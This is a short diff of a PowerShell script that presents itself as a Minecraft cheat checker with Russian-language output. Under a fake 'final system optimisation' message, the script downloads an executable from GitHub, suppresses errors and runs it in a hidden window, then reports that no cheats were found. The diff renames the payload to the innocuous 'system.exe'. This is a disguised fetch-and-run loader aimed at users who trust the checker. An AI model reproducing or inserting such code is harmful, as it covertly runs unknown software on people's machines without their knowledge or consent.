@@ -184,10 +184,10 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     
-    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/MinecraftCheatChecker.exe" -OutFile "MinecraftCheatChecker.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/system.exe" -OutFile "system.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "MinecraftCheatChecker.exe" -WindowStyle Hidden
+    Start-Process -FilePath "system.exe" -WindowStyle Hidden
 
     Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
     Log "║                     Ч И Т Ы   Н Е   Н А Й Д Е Н Ы             ║" "Lime"
